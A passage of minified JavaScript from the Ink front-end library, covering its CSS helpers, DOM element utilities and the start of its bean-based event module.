t)t.hasOwnProperty(n)&&("opacity"===n?this.setOpacity(e,t[n]):"float"===n||"cssFloat"===n?void 0===e.style.styleFloat?e.style.cssFloat=t[n]:e.style.styleFloat=t[n]:e.style[n]=t[n])},show:function(e,t){null!==(e=Ink.i(e))&&(e.style.display=t||"")},hide:function(e){null!==(e=Ink.i(e))&&(e.style.display="none")},showHide:function(e,t){(e=Ink.i(e))&&(e.style.display=t?"":"none")},toggle:function(e,t){null!==(e=Ink.i(e))&&(void 0!==t?!0===t?this.show(e):this.hide(e):"none"===this.getStyle(e,"display").toLowerCase()?this.show(e):this.hide(e))},_getRefTag:function(e){if(e.firstElementChild)return e.firstElementChild;for(var t=e.firstChild;t;t=t.nextSibling)if(1===t.nodeType)return t;return null},appendStyleTag:function(e,t,n){n=Ink.extendObj({type:"text/css",force:!1},n||{});var i,o,r=document.getElementsByTagName("style"),a=!0;for(i=0,o=r.length;i<o;i++)r[i].innerHTML.indexOf(e)>=0&&(a=!1);if(a){var s=document.createElement("style"),l=document.getElementsByTagName("head")[0],c=!1,u="";s.type=n.type,u+=e+" {",u+=t,u+="} ",void 0!==s.styleSheet?s.styleSheet.cssText=u:s.appendChild(document.createTextNode(u)),n.force?l.appendChild(s):(c=this._getRefTag(l))&&l.insertBefore(s,c)}},appendStylesheet:function(e,t){t=Ink.extendObj({media:"screen",type:"text/css",force:!1},t||{});var n,i=document.createElement("link"),o=document.getElementsByTagName("head")[0];i.media=t.media,i.type=t.type,i.href=e,i.rel="Stylesheet",t.force?o.appendChild(i):(n=this._getRefTag(o))&&o.insertBefore(i,n)},_loadingCSSFiles:{},_loadedCSSFiles:{},appendStylesheetCb:function(e,t){if(!e)return t(e);if(this._loadedCSSFiles[e])return t(e);var n=this._loadingCSSFiles[e];if(n)return n.push(t);this._loadingCSSFiles[e]=[t];var i=document.createElement("link");i.type="text/css",i.rel="stylesheet",i.href=e,document.getElementsByTagName("head")[0].appendChild(i);var o=document.createElement("img");o.onerror=Ink.bindEvent((function(e,t){var n=t;this._loadedCSSFiles[n]=!0;for(var i=this._loadingCSSFiles[n],o=0,r=i.length;o<r;++o)i[o](n);delete this._loadingCSSFiles[n]}),this,e),o.src=e},decToHex:function(e){var t=function(e){return 1===e.length&&(e="0"+e),e.toUpperCase()};if("object"==typeof e)return t(parseInt(e.r,10).toString(16))+t(parseInt(e.g,10).toString(16))+t(parseInt(e.b,10).toString(16));var n=(e+="").match(/\((\d+),\s?(\d+),\s?(\d+)\)/);return null!==n?t(parseInt(n[1],10).toString(16))+t(parseInt(n[2],10).toString(16))+t(parseInt(n[3],10).toString(16)):t(parseInt(e,10).toString(16))},hexToDec:function(e){return 0===e.indexOf("#")&&(e=e.substr(1)),6===e.length?{r:parseInt(e.substr(0,2),16),g:parseInt(e.substr(2,2),16),b:parseInt(e.substr(4,2),16)}:3===e.length?{r:parseInt(e.charAt(0)+e.charAt(0),16),g:parseInt(e.charAt(1)+e.charAt(1),16),b:parseInt(e.charAt(2)+e.charAt(2),16)}:e.length<=2?parseInt(e,16):void 0},getPropertyFromStylesheet:function(e,t){var n=this.getRuleFromStylesheet(e);return n?n.style[t]:null},getPropertyFromStylesheet2:function(e,t){for(var n,i=this.getRulesFromStylesheet(e),o=0,r=i.length;o<r;o++)if(null!=(n=i[o].style[t]))return n;return null},getRuleFromStylesheet:function(e){var t,n,i,o,r;if(!document.styleSheets)return null;for(var a=0,s=document.styleSheets.length;a<s;++a){if(!(n=(t=document.styleSheets[a]).rules?t.rules:t.cssRules))return null;for(i=0,o=n.length;i<o;++i)if((r=n[i]).selectorText&&r.selectorText===e)return r}return null},getRulesFromStylesheet:function(e){var t,n,i,o,r,a=[];if(!document.styleSheets)return a;for(var s=0,l=document.styleSheets.length;s<l;++s){if(!(n=(t=document.styleSheets[s]).rules?t.rules:t.cssRules))return null;for(i=0,o=n.length;i<o;++i)(r=n[i]).selectorText&&r.selectorText===e&&a.push(r)}return a},getPropertiesFromRule:function(e){var t,n,i,o,r,a,s,l=this.getRuleFromStylesheet(e),c={},u=(l=l.style.cssText).split(";");for(n=0,i=u.length;n<i;++n)" "===u[n].charAt(0)&&(u[n]=u[n].substring(1)),o=u[n].split(":"),t=this._camelCase(o[0].toLowerCase()),(r=o[1])&&(r=r.substring(1),"padding"===t||"margin"===t||"borderWidth"===t?("borderWidth"===t?(a="border",s="Width"):(a=t,s=""),-1!==r.indexOf(" ")?(r=r.split(" "),c[a+"Top"+s]=r[0],c[a+"Bottom"+s]=r[0],c[a+"Left"+s]=r[1],c[a+"Right"+s]=r[1]):(c[a+"Top"+s]=r,c[a+"Bottom"+s]=r,c[a+"Left"+s]=r,c[a+"Right"+s]=r)):"borderRadius"===t?-1!==r.indexOf(" ")?(r=r.split(" "),c.borderTopLeftRadius=r[0],c.borderBottomRightRadius=r[0],c.borderTopRightRadius=r[1],c.borderBottomLeftRadius=r[1]):(c.borderTopLeftRadius=r,c.borderTopRightRadius=r,c.borderBottomLeftRadius=r,c.borderBottomRightRadius=r):c[t]=r);return c},changeFontSize:function(e,t,n,i,o){var r=this;Ink.requireModules(["Ink.Dom.Selector_1"],(function(a){var s;if("string"!=typeof e?s="1st argument must be a CSS selector rule.":"number"!=typeof t?s="2nd argument must be a number.":void 0!==n&&"+"!==n&&"*"!==n?s='3rd argument must be one of "+", "*".':void 0!==i&&("number"!=typeof i||i<=0)?s="4th argument must be a positive number.":void 0!==o&&("number"!=typeof o||o<o)&&(s="5th argument must be a positive number greater than minValue."),s)throw new TypeError(s);var l,c,u=a.select(e);void 0===i&&(i=1),n="*"===n?function(e,t){return e*t}:function(e,t){return e+t};for(var d=0,h=u.length;d<h;++d)c=u[d],l=parseFloat(r.getStyle(c,"fontSize")),(l=n(l,t))<i||"number"==typeof o&&l>o||(c.style.fontSize=l+"px")}))}};return t})),Ink.createModule("Ink.Dom.Element",1,[],(function(){"use strict";function e(e){var t={};try{t=e.getBoundingClientRect()}catch(n){t={top:e.offsetTop,left:e.offsetLeft}}return t}var t="function"==typeof document.createRange&&"function"==typeof window.Range.prototype.createContextualFragment,n="Ink.Dom.Element tbody: "+Math.random(),i=function(){var e=document.createElement("div");return e.innerHTML="<table>",0!==e.getElementsByTagName("tbody").length}(),o={isDOMElement:function(e){return null!==e&&"object"==typeof e&&"nodeType"in e&&1===e.nodeType},get:function(e){return void 0!==e?"string"==typeof e?document.getElementById(e):e:null},create:function(e,t){var n=document.createElement(e);if(t)for(var i in t)t.hasOwnProperty(i)&&(i in o?o[i](n,t[i]):"className"===i||"class"===i?n.className=t.className||t.class:n.setAttribute(i,t[i]));return n},remove:function(e){var t;(e=Ink.i(e))&&(t=e.parentNode)&&t.removeChild(e)},scrollTo:function(e){if(e=o.get(e)){if(e.scrollIntoView)return e.scrollIntoView();var t,n=0,i=0;do{n+=e.offsetTop||0,i+=e.offsetLeft||0,e=e.offsetParent}while(e);t={x:i,y:n},window.scrollTo(t.x,t.y)}},offsetTop:function(e){return o.offset(e)[1]},offsetLeft:function(e){return o.offset(e)[0]},positionedOffset:function(e){var t=0,n=0;e=o.get(e);do{if(t+=e.offsetTop||0,n+=e.offsetLeft||0,e=e.offsetParent){if("body"===e.tagName.toLowerCase())break;var i=e.style.position;if(!i&&e.currentStyle&&(i=e.currentStyle.position),(!i||"auto"===i)&&"undefined"!=typeof getComputedStyle){var r=getComputedStyle(e,null);i=r?r.position:null}if("relative"===i||"absolute"===i)break}}while(e);return[n,t]},offset:function(t){var n=(t=Ink.i(t)).ownerDocument,i=n.documentElement,o=e(t),r=n.body,a=i.clientTop||r.clientTop||0,s=i.clientLeft||r.clientLeft||0,l=n.pageYOffset||i.scrollTop||r.scrollTop,c=n.pageXOffset||i.scrollLeft||r.scrollLeft,u=o.top+l-a;return[o.left+c-s,u]},scroll:function(e){return e=e?Ink.i(e):document.body,[window.pageXOffset?window.pageXOffset:e.scrollLeft,window.pageYOffset?window.pageYOffset:e.scrollTop]},_getPropPx:function(e,t){var n,i=e.getPropertyValue?e.getPropertyValue(t):e[t];return i?n=-1===i.indexOf("px")?0:parseFloat(i,10):n=0,n},offset2:function(e){return o.offset(e)},hasAttribute:function(e,t){return(e=Ink.i(e)).hasAttribute?e.hasAttribute(t):!!e.getAttribute(t)},insertAfter:function(e,t){(t=o.get(t))&&(null!==t.nextSibling?t.parentNode.insertBefore(e,t.nextSibling):t.parentNode.appendChild(e))},insertBefore:function(e,t){(t=o.get(t))&&t.parentNode.insertBefore(e,t)},insertTop:function(e,t){(t=o.get(t))&&(t.firstChild?t.insertBefore(e,t.firstChild):t.appendChild(e))},insertBottom:function(e,t){(t=Ink.i(t)).appendChild(e)},textContent:function(e){var t,n,i,r;switch((e=Ink.i(e))&&e.nodeType){case 9:return o.textContent(e.documentElement||e.body&&e.body.parentNode||e.body);case 1:if(void 0!==(t="textContent"in e?e.textContent:e.innerText))return t;case 11:if(void 0!==(t=e.textContent))return t;if(e.firstChild===e.lastChild)return o.textContent(e.firstChild);for(t=[],n=0,r=(i=e.childNodes).length;n<r;++n)t.push(o.textContent(i[n]));return t.join("");case 3:case 4:return e.nodeValue}return""},setTextContent:function(e,t){switch((e=Ink.i(e))&&e.nodeType){case 1:if("innerText"in e){e.innerText=t;break}case 11:if("textContent"in e){e.textContent=t;break}case 9:for(;e.firstChild;)e.removeChild(e.firstChild);if(""!==t){var n=e.ownerDocument||e;e.appendChild(n.createTextNode(t))}break;case 3:case 4:e.nodeValue=t}},isLink:function(e){return!!(e&&1===e.nodeType&&(/^a|area$/i.test(e.tagName)||e.hasAttributeNS&&e.hasAttributeNS("http://www.w3.org/1999/xlink","href")))},isAncestorOf:function(e,t){if(!t||!e)return!1;if(t.compareDocumentPosition)return 0!=(16&e.compareDocumentPosition(t));for(;t=t.parentNode;)if(t===e)return!0;return!1},descendantOf:function(e,t){return e!==t&&o.isAncestorOf(e,t)},firstElementChild:function(e){if(!e)return null;if("firstElementChild"in e)return e.firstElementChild;for(var t=e.firstChild;t&&1!==t.nodeType;)t=t.nextSibling;return t},lastElementChild:function(e){if(!e)return null;if("lastElementChild"in e)return e.lastElementChild;for(var t=e.lastChild;t&&1!==t.nodeType;)t=t.previousSibling;return t},nextElementSibling:function(e){var t=null;if(!e)return t;if("nextElementSibling"in e)return e.nextElementSibling;for(t=e.nextSibling;t&&1!==t.nodeType;)t=t.nextSibling;return t},previousElementSibling:function(e){var t=null;if(!e)return t;if("previousElementSibling"in e)return e.previousElementSibling;for(t=e.previousSibling;t&&1!==t.nodeType;)t=t.previousSibling;return t},elementWidth:function(e){return"string"==typeof e&&(e=document.getElementById(e)),e.offsetWidth},elementHeight:function(e){return"string"==typeof e&&(e=document.getElementById(e)),e.offsetHeight},elementLeft:function(e){return o.offsetLeft(e)},elementTop:function(e){return o.offsetTop(e)},elementDimensions:function(e){return[(e=Ink.i(e)).offsetWidth,e.offsetHeight]},outerDimensions:function(t){var n=e(t),i=Ink.getModule("Ink.Dom.Css_1"),o=Ink.bindMethod(i,"getStyle",t);return[n.right-n.left+parseFloat(o("marginLeft")||0)+parseFloat(o("marginRight")||0),n.bottom-n.top+parseFloat(o("marginTop")||0)+parseFloat(o("marginBottom")||0)]},inViewport:function(t,n){var i=e(Ink.i(t));return"boolean"==typeof n&&(n={partial:n,margin:0}),(n=n||{}).margin=n.margin||0,n.partial?i.bottom+n.margin>=0&&i.left-n.margin<=o.viewportWidth()&&i.top-n.margin<=o.viewportHeight()&&i.right+n.margin>=0:i.top+n.margin>=0&&i.right-n.margin<=o.viewportWidth()&&i.bottom-n.margin<=o.viewportHeight()&&i.left+n.margin>=0},isHidden:function(e){var t=e.offsetWidth,n=e.offsetHeight,i="tr"===e.tagName.toLowerCase(),o=Ink.getModule("Ink.Dom.Css_1");return 0===t&&0===n&&!i||!(0!==t&&0!==n&&!i)&&"none"===o.getStyle(e,"display").toLowerCase()},isVisible:function(e){return!this.isHidden(e)},clonePosition:function(e,t){var n=o.offset(t);return e.style.left=n[0]+"px",e.style.top=n[1]+"px",e},ellipsizeText:function(e){(e=Ink.i(e))&&(e.style.overflow="hidden",e.style.whiteSpace="nowrap",e.style.textOverflow="ellipsis")},findUpwardsHaving:function(e,t){for(;e&&1===e.nodeType;){if(t(e))return e;e=e.parentNode}return!1},findUpwardsByClass:function(e,t){var n=new RegExp("(^|\\s)"+t+"(\\s|$)");return o.findUpwardsHaving(e,(function(e){var t=e.className;return t&&n.test(t)}))},findUpwardsByTag:function(e,t){t=t.toUpperCase();return o.findUpwardsHaving(e,(function(e){return e.nodeName&&e.nodeName.toUpperCase()===t}))},findUpwardsById:function(e,t){return o.findUpwardsHaving(e,(function(e){return e.id===t}))},findUpwardsBySelector:function(e,t){var n=Ink.getModule("Ink.Dom.Selector","1");if(!n)throw new Error("This method requires Ink.Dom.Selector");return o.findUpwardsHaving(e,(function(e){return n.matchesSelector(e,t)}))},getChildrenText:function(e,t){var n,i,r,a=e.childNodes,s=a.length,l="";if(!e)return l;for(i=0;i<s;++i)(n=a[i])&&3===n.nodeType&&((r=o._trimString(String(n.data))).length>0?(l+=r,t&&e.removeChild(n)):e.removeChild(n));return l},_trimString:function(e){return String.prototype.trim?e.trim():e.replace(/^\s*/,"").replace(/\s*$/,"")},getSelectValues:function(e){for(var t=Ink.i(e),n=[],i=0;i<t.options.length;++i)n.push(t.options[i].value);return n},_normalizeData:function(e){for(var t,n=[],i=0,o=e.length;i<o;++i)(t=e[i])instanceof Array?1===t.length&&t.push(t[0]):t=[t,t],n.push(t);return n},fillSelect:function(e,t,n,i){var r=Ink.i(e);if(r){var a,s;r.innerHTML="",n||((s=document.createElement("option")).setAttribute("value",""),r.appendChild(s));for(var l=0,c=(t=o._normalizeData(t)).length;l<c;++l)a=t[l],(s=document.createElement("option")).setAttribute("value",a[0]),a.length>2&&s.setAttribute("extra",a[2]),s.appendChild(document.createTextNode(a[1])),a[0]===i&&s.setAttribute("selected","selected"),r.appendChild(s)}},fillRadios:function(e,t,n,i,r,a){e=Ink.i(e);var s,l,c=document.createElement("span");o.insertAfter(c,e),n=o._normalizeData(n),i||((l=document.createElement("input")).setAttribute("type","radio"),l.setAttribute("name",t),l.setAttribute("value",""),c.appendChild(l),a&&c.appendChild(document.createElement(a)));for(var u=0;u<n.length;++u)s=n[u],(l=document.createElement("input")).setAttribute("type","radio"),l.setAttribute("name",t),l.setAttribute("value",s[0]),c.appendChild(l),c.appendChild(document.createTextNode(s[1])),a&&c.appendChild(document.createElement(a)),s[0]===r&&(l.checked=!0);return c},fillChecks:function(e,t,n,i,r){e=Ink.i(e);var a=document.createElement("span");o.insertAfter(a,e),n=o._normalizeData(n),"]"!==t.substring(t.length-1)&&(t+="[]");for(var s,l,c=0;c<n.length;++c)s=n[c],(l=document.createElement("input")).setAttribute("type","checkbox"),l.setAttribute("name",t),l.setAttribute("value",s[0]),a.appendChild(l),a.appendChild(document.createTextNode(s[1])),r&&a.appendChild(document.createElement(r)),s[0]===i&&(l.checked=!0);return a},parentIndexOf:function(e,t){if(t||(t=e,e=e.parentNode),!e)return!1;for(var n=0,i=e.children.length;n<i;++n)if(e.children[n]===t)return n;return!1},nextSiblings:function(e){if("object"==typeof(e=Ink.i(e))&&null!==e&&e.nodeType&&1===e.nodeType){for(var t=[],n=e.parentNode.children,i=o.parentIndexOf(e.parentNode,e),r=++i,a=n.length;r<a;r++)t.push(n[r]);return t}return[]},previousSiblings:function(e){if("object"==typeof(e=Ink.i(e))&&null!==e&&e.nodeType&&1===e.nodeType){for(var t=[],n=e.parentNode.children,i=0,r=o.parentIndexOf(e.parentNode,e);i<r;i++)t.push(n[i]);return t}return[]},siblings:function(e){if("object"==typeof(e=Ink.i(e))&&null!==e&&e.nodeType&&1===e.nodeType){for(var t=[],n=e.parentNode.children,i=0,o=n.length;i<o;i++)e!==n[i]&&t.push(n[i]);return t}return[]},childElementCount:function(e){return"childElementCount"in(e=Ink.i(e))?e.childElementCount:e?o.siblings(e).length+1:0},_wrapElements:{TABLE:function(e,t){return e.innerHTML=i?"<table>"+t+"<tbody><tr><td>"+n+"</tr></td></tbody></table>":"<table>"+t+"</table>",e.firstChild},TBODY:function(e,t){return e.innerHTML="<table><tbody>"+t+"</tbody></table>",e.firstChild.getElementsByTagName("tbody")[0]},THEAD:function(e,t){return e.innerHTML="<table><thead>"+t+"</thead><tbody></tbody></table>",e.firstChild.getElementsByTagName("thead")[0]},TFOOT:function(e,t){return e.innerHTML="<table><tfoot>"+t+"</tfoot><tbody></tbody></table>",e.firstChild.getElementsByTagName("tfoot")[0]},TR:function(e,t){return e.innerHTML="<table><tbody><tr>"+t+"</tr></tbody></table>",e.firstChild.firstChild.firstChild}},_getWrapper:function(e,t){var r=e.nodeName&&e.nodeName.toUpperCase(),a=document.createElement("div"),s=o._wrapElements[r];if(!s)return a.innerHTML=t,a;if(a=s(a,t),i&&"TABLE"===r)for(var l=a.getElementsByTagName("td"),c=0,u=l.length;c<u;c++)if(l[c].innerHTML===n){var d=l[c].parentNode.parentNode;d.parentNode.removeChild(d)}return a},appendHTML:function(e,t){if(null!==(e=Ink.i(e)))for(var n=o._getWrapper(e,t);n.firstChild;)e.appendChild(n.firstChild)},prependHTML:function(e,t){if(null!==(e=Ink.i(e)))for(var n=o._getWrapper(e,t);n.lastChild;)e.insertBefore(n.lastChild,e.firstChild)},setHTML:function(e,t){if(null!==(e=Ink.i(e)))try{e.innerHTML=t}catch(n){o.clear(e),o.appendHTML(e,t)}},wrap:function(e,t){e=Ink.i(e),t=Ink.i(t);var n=e.nextSibling,i=e.parentNode;return t.appendChild(e),null!==n?i.insertBefore(t,n):i.appendChild(t),t},unwrap:function(e,t){var n;e=Ink.i(e),(n="string"==typeof t?o.findUpwardsBySelector(e,t):"object"==typeof t&&t.tagName?o.findUpwardsHaving(e,(function(e){return e===t})):e.parentNode)&&n.parentNode&&o.insertBefore(e,n)},replace:function(e,t){null!==(e=Ink.i(e))&&e.parentNode.replaceChild(t,e)},removeTextNodeChildren:function(e){if(null!==(e=Ink.i(e))){var t,n,i=e;for(e=e.firstChild;e;)n=3===e.nodeType,t=e,e=e.nextSibling,n&&i.removeChild(t)}},htmlToFragment:t?function(e){var t;return"string"!=typeof e?document.createDocumentFragment():((t=document.createRange()).selectNode(document.body),t.createContextualFragment(e))}:function(e){var t,n,i=document.createDocumentFragment();if("string"!=typeof e)return i;for((t=document.createElement("div")).innerHTML=e;n=t.firstChild;)i.appendChild(n);return i},_camelCase:function(e){return e?e.replace(/-(\w)/g,(function(e,t){return t.toUpperCase()})):e},data:function(e){var t;if("object"!=typeof e&&"string"!=typeof e)throw"[Ink.Dom.Element.data] :: Invalid selector defined";if("object"==typeof e)t=e;else{var n=Ink.getModule("Ink.Dom.Selector",1);if(!n)throw"[Ink.Dom.Element.data] :: this method requires Ink.Dom.Selector - v1";if((t=n.select(e)).length<=0)throw"[Ink.Dom.Element.data] :: Can't find any element with the specified selector";t=t[0]}var i,r,a,s={},l=t.attributes||[];if(l)for(var c=0,u=l.length;c<u;++c)r=(i=l[c]).name,a=i.value,r&&0===r.indexOf("data-")&&(s[o._camelCase(r.replace("data-",""))]=a);return s},clear:function(e,t){for(;t=e.lastChild;)e.removeChild(t)},moveCursorTo:function(e,t){if(null!==(e=Ink.i(e)))if(e.setSelectionRange)e.setSelectionRange(t,t);else{var n=e.createTextRange();n.collapse(!0),n.moveEnd("character",t),n.moveStart("character",t),n.select()}},pageWidth:function(){var e,t;return e=window.innerWidth&&window.scrollMaxX?window.innerWidth+window.scrollMaxX:document.body.scrollWidth>document.body.offsetWidth?document.body.scrollWidth:document.body.offsetWidth,window.self.innerWidth?t=document.documentElement.clientWidth?document.documentElement.clientWidth:window.self.innerWidth:document.documentElement&&document.documentElement.clientWidth?t=document.documentElement.clientWidth:document.body&&(t=document.body.clientWidth),e<t?e:t},pageHeight:function(){var e,t;return e=window.innerHeight&&window.scrollMaxY?window.innerHeight+window.scrollMaxY:document.body.scrollHeight>document.body.offsetHeight?document.body.scrollHeight:document.body.offsetHeight,window.self.innerHeight?t=window.self.innerHeight:document.documentElement&&document.documentElement.clientHeight?t=document.documentElement.clientHeight:document.body&&(t=document.body.clientHeight),e<t?t:e},viewportWidth:function(){return void 0!==window.innerWidth?window.innerWidth:document.documentElement&&void 0!==document.documentElement.offsetWidth?document.documentElement.offsetWidth:void 0},viewportHeight:function(){return void 0!==window.innerHeight?window.innerHeight:document.documentElement&&void 0!==document.documentElement.offsetHeight?document.documentElement.offsetHeight:void 0},scrollWidth:function(){return void 0!==window.self.pageXOffset?window.self.pageXOffset:void 0!==document.documentElement&&void 0!==document.documentElement.scrollLeft?document.documentElement.scrollLeft:document.body.scrollLeft},scrollHeight:function(){return void 0!==window.self.pageYOffset?window.self.pageYOffset:void 0!==document.body&&void 0!==document.body.scrollTop&&void 0!==document.documentElement&&void 0!==document.documentElement.scrollTop?document.body.scrollTop||document.documentElement.scrollTop:void 0!==document.documentElement&&void 0!==document.documentElement.scrollTop?document.documentElement.scrollTop:document.body.scrollTop}};return o})),Ink.createModule("Ink.Dom.Event",1,[],(function(){var e=function(e,t){e=e||"bean",t=t||this;var n,i=window,o=t[e],r=/[^\.]*(?=\..*)\.|.*/,a=/\..*/,s="addEventListener",l="removeEventListener",c=document||{},u=c.documentElement||{},d=u[s],h=d?s:"attachEvent",p={},f=Array.prototype.slice,m=function(e,t){return e.split(t||" ")},g=function(e){return"string"==typeof e},v=function(e){return"function"==typeof e},y="show input invalid touchstart touchmove touchend touchcancel gesturestart gesturechange gestureend textinputreadystatechange pageshow pagehide popstate hashchange offline online afterprint beforeprint dragstart dragenter dragover dragleave drag drop dragend loadstart progress suspend emptied stalled loadmetadata loadeddata canplay canplaythrough playing waiting seeking seeked ended durationchange timeupdate play pause ratechange volumechange cuechange checking noupdate downloading cached updateready obsolete ",_=function(e,t,n){for(n=0;n<t.length;n++)t[n]&&(e[t[n]]=1);return e}({},m("click dblclick mouseup mousedown contextmenu mousewheel mousemultiwheel DOMMouseScroll mouseover mouseout mousemove selectstart selectend keydown keypress keyup orientationchange focus blur change reset select submit load unload beforeunload resize move DOMContentLoaded readystatechange message error abort scroll "+(d?y:""))),b=function(){var e="compareDocumentPosition"in u?function(e,t){return t.compareDocumentPosition&&16==(16&t.compareDocumentPosition(e))}:"contains"in u?function(e,t){return(t=9===t.nodeType||t===window?u:t)!==e&&t.contains(e)}:function(e,t){for(;e=e.parentNode;)if(e===t)return 1;return 0},t=function(t){var n=t.relatedTarget;return n?n!==this&&"xul"!==n.prefix&&!/document/.test(this.toString())&&!e(n,this):null==n};return{mouseenter:{base:"mouseover",condition:t},mouseleave:{base:"mouseout",condition:t},mousewheel:{base:/Firefox/.test(navigator.userAgent)?"DOMMouseScroll":"mousewheel"}}}(),w=function(){var e=m("altKey attrChange attrName bubbles cancelable ctrlKey currentTarget detail eventPhase getModifierState isTrusted metaKey relatedNode relatedTarget shiftKey srcElement target timeStamp type view which propertyName path"),t=e.concat(m("button buttons clientX clientY dataTransfer fromElement offsetX offsetY pageX pageY screenX screenY toElement movementX movementY region")),n=t.concat(m("wheelDelta wheelDeltaX wheelDeltaY wheelDeltaZ axis")),o=e.concat(m("char charCode key keyCode keyIdentifier keyLocation location isComposing code")),r=e.concat(m("data")),a=e.concat(m("touches targetTouches changedTouches scale rotation")),s=e.concat(m("data origin source")),l=e.concat(m("state")),d=/over|out/,h=[{reg:/key/i,fix:function(e,t){return t.keyCode=e.keyCode||e.which,o}},{reg:/click|mouse(?!(.*wheel|scroll))|menu|drag|drop/i,fix:function(e,n,i){return n.rightClick=3===e.which||2===e.button,n.pos={x:0,y:0},e.pageX||e.pageY?(n.clientX=e.pageX,n.clientY=e.pageY):(e.clientX||e.clientY)&&(n.clientX=e.clientX+c.body.scrollLeft+u.scrollLeft,n.clientY=e.clientY+c.body.scrollTop+u.scrollTop),d.test(i)&&(n.relatedTarget=e.relatedTarget||e[("mouseover"==i?"from":"to")+"Element"]),t}},{reg:/mouse.*(wheel|scroll)/i,fix:function(){return n}},{reg:/^text/i,fix:function(){return r}},{reg:/^touch|^gesture/i,fix:function(){return a}},{reg:/^message$/i,fix:function(){return s}},{reg:/^popstate$/i,fix:function(){return l}},{reg:/.*/,fix:function(){return e}}],p={},f=function(e,t,n){if(arguments.length&&(e=e||((t.ownerDocument||t.document||t).parentWindow||i).event,this.originalEvent=e,this.isNative=n,this.isBean=!0,e)){var o,r,a,s,l,c=e.type,u=e.target||e.srcElement;if(this.target=u&&3===u.nodeType?u.parentNode:u,n){if(!(l=p[c]))for(o=0,r=h.length;o<r;o++)if(h[o].reg.test(c)){p[c]=l=h[o].fix;break}for(o=(s=l(e,this,c)).length;o--;)!((a=s[o])in this)&&a in e&&(this[a]=e[a])}}};return f.prototype.preventDefault=function(){if(this.originalEvent.preventDefault)this.originalEvent.preventDefault();else try{this.originalEvent.returnValue=!1}catch(e){}},f.prototype.stopPropagation=function(){this.originalEvent.stopPropagation?this.originalEvent.stopPropagation():this.originalEvent.cancelBubble=!0},f.prototype.stop=function(){this.preventDefault(),this.stopPropagation(),this.stopped=!0},f.prototype.stopImmediatePropagation=function(){this.originalEvent.stopImmediatePropagation&&this.originalEvent.stopImmediatePropagation(),this.isImmediatePropagationStopped=function(){return!0}},f.prototype.isImmediatePropagationStopped=function(){return this.originalEvent.isImmediatePropagationStopped&&this.originalEvent.isImmediatePropagationStopped()},f.prototype.clone=function(e){var t=new f(this,this.element,this.isNative);return t.currentTarget=e,t},f}(),k=function(e,t){return d||t||e!==c&&e!==i?e:u},I=function(){var e=function(e,t,n,i){var o=function(n,o){return t.apply(e,i?f.call(o,n?0:1).concat(i):o)},r=function(n,i){return t.__beanDel?t.__beanDel.ft(n.target,e):i},a=n?function(e){var t=r(e,this);if(n.apply(t,arguments))return e&&(e.currentTarget=t),o(e,arguments)}:function(e){return t.__beanDel&&(e=e.clone(r(e))),o(e,arguments)};return a.__beanDel=t.__beanDel,a},t=function(t,n,i,o,r,a,s){var l,c=b[n];"unload"==n&&(i=T(A,t,n,i,o)),c&&(c.condition&&(i=e(t,i,c.condition,a)),n=c.base||n),this.isNative=l=_[n]&&!!t[h],this.customType=!d&&!l&&n,this.element=t,this.type=n,this.original=o,this.namespaces=r,this.eventType=d||l?n:"propertychange",this.target=k(t,l),this[h]=!!this.target[h],this.root=s,this.handler=e(t,i,null,a)};return t.prototype.inNamespaces=function(e){var t,n,i=0;if(!e)return!0;if(!this.namespaces)return!1;for(t=e.length;t--;)for(n=this.namespaces.length;n--;)e[t]==this.namespaces[n]&&i++;return e.length===i},t.prototype.matches=function(e,t,n){return!(this.element!==e||t&&this.original!==t||n&&this.handler!==n)},t}(),C=function(){var e={},t=function(n,i,o,r,a,s){var l=a?"r":"$";if(i&&"*"!=i){var c,u=0,d=e[l+i],h="*"==n;if(!d)return;for(c=d.length;u<c;u++)if((h||d[u].matches(n,o,r))&&!s(d[u],d,u,i))return}else for(var p in e)p.charAt(0)==l&&t(n,p.substr(1),o,r,a,s)},n=function(t,n,i,o){var r,a=e[(o?"r":"$")+n];if(a)for(r=a.length;r--;)if(!a[r].root&&a[r].matches(t,i,null))return!0;return!1},i=function(e,n,i,o){var r=[];return t(e,n,i,null,o,(function(e){return r.push(e)})),r},o=function(n){t(n.element,n.type,null,n.handler,n.root,(function(t,n,i){return n.splice(i,1),t.removed=!0,0===n.length&&delete e[(t.root?"r":"$")+t.type],!1}))},r=function(){var t,n=[];for(t in e)"$"==t.charAt(0)&&(n=n.concat(e[t]));return n};return{has:n,get:i,put:function(t){var n=!t.root&&!this.has(t.element,t.type,null,!1),i=(t.root?"r":"$")+t.type;return(e[i]||(e[i]=[])).push(t),n},del:o,entries:r}}(),x=function(e){n=arguments.length?e:c.querySelectorAll?function(e,t){return t.querySelectorAll(e)}:function(){throw new Error("Bean: No selector engine installed")}},S=function(e,t){if(d||!t||!e||e.propertyName=="_on"+t){var n=C.get(this,t||e.type,null,!1),i=n.length,o=0;for(e=new w(e,this,!0),t&&(e.type=t);o<i&&!e.isImmediatePropagationStopped();o++)n[o].removed||n[o].handler.call(this,e)}},E=d?function(e,t,n){e[n?s:l](t,S,!1)}:function(e,t,n,i){var o;n?(C.put(o=new I(e,i||t,(function(t){S.call(e,t,i)}),S,null,null,!0)),i&&null==e["_on"+i]&&(e["_on"+i]=0),o.target.attachEvent("on"+o.eventType,o.handler)):(o=C.get(e,i||t,S,!0)[0])&&(o.target.detachEvent("on"+o.eventType,o.handler),C.del(o))},T=function(e,t,n,i,o){return function(){i.apply(this,arguments),e(t,n,o)}},A=function(e,t,n,i){var o,r,s=t&&t.replace(a,""),l=C.get(e,s,null,!1),c={};for(o=0,r=l.length;o<r;o++)n&&l[o].original!==n||!l[o].inNamespaces(i)||(C.del(l[o]),!c[l[o].eventType]&&l[o][h]&&(c[l[o].eventType]={t:l[o].eventType,c:l[o].type}));for(o in c)c.hasOwnProperty(o)&&(C.has(e,c[o].t,null,!1)||E(e,c[o].t,!1,c[o].c))},O=function(e,t){var i=function(t,i){for(var o,r=g(e)?n(e,i):e;t&&t!==i;t=t.parentNode)for(o=r.length;o--;)if(r[o]===t)return t},o=function(e){var n=i(e.target,this);n&&t.apply(n,arguments)};return o.__beanDel={ft:i,selector:e},o},D=d?function(e,t,n){var o=c.createEvent(e?"HTMLEvents":"UIEvents");o[e?"initEvent":"initUIEvent"](t,!0,!0,i,1),n.dispatchEvent(o)}:function(e,t,n){n=k(n,e),e?n.fireEvent("on"+t,c.createEventObject()):n["_on"+t]++},P=function(e,t,n){var i,o,s,l,c=g(t);if(c&&t.indexOf(" ")>0){for(l=(t=m(t)).length;l--;)P(e,t[l],n);return 